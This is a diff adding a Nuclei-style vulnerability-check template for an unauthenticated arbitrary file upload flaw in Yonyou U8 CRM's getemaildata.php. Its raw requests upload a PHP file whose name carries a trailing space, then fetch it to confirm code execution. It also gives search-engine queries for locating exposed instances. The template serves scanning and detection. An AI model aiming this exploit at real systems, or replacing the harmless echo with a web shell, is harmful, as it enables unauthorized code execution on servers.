@@ -1,0 +1,50 @@
+
+id: yonyou-u8-crm-upload-getemaildata
+
+info:
+  name: yonyou-u8-crm-upload-getemaildata
+  author: p1z
+  severity: critical
+  description: |
+    用友 U8 CRM 客户关系管理系统 getemaildata.php 任意文件上传漏洞
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/ca1918ddbaedb053ce00e6fb2e40af5df2eaad58/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getemaildata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="用友-U8CRM"
+    hunter-query: web.body="用友U8CRM"
+    verified: true
+  tags: 2023,yongyou,y8-crm,upload
+
+requests:
+  - raw:
+    - |
+      POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
+      
+      ------WebKitFormBoundarykS5RKgl8t3nwInMQ
+      Content-Disposition: form-data; name="file"; filename="1nfo.php "
+      Content-Type: text/plain
+      
+      <?php echo "hello world";unlink(__FILE__);?>
+      
+      ------WebKitFormBoundarykS5RKgl8t3nwInMQ
+
+    - |
+      GET /tmpfile/upd{{dec_to_hex(hex_to_dec(name)-1)}}.tmp.php HTTP/1.1
+      Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: name
+        group: 1 
+        regex:
+         - 'mht(\w+)\.tmp'
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - 'hello world'
+        part: body
